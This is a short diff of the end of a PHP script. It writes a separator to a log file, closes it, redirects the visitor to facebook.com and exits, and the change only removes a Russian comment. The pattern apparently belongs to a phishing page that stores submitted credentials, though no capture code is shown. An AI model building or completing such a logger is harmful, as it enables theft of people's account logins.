@@ -10,5 +10,5 @@ fwrite($fp, "---------------\n");
 fclose($fp);
 
 header('Location: https://facebook.com');
-exit(); // Убедитесь, что скрипт прекращает выполнение после перенаправления.
+exit();
 ?>
